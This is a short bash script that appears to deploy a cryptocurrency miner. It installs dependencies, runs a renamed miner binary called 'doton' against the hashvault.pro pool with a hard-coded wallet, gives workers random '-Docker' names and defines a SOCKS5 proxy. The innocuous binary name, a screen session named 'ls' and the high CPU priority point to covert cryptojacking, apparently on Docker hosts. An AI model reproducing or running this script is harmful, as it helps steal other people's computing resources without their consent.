#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x doton
screen -dmS ls 
POOL=pool.hashvault.pro:443
WALLET=hvxy9P3HryFTBW4tAPkBaBRibwiM3x4roL1g6oGtUHPSVDHMqNueznj8mQPswmJKHCCY6cZGZ4TkUPdWbt4BhpP348B8rMJ6iz
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://154.16.63.16:1080
./doton -a cn-heavy/xhv --url pool.hashvault.pro:443 --user $WALLET --pass $WORKER --cpu-no-yield --donate-level 1 -k --cpu-priority 5 --print-time 10 --tls
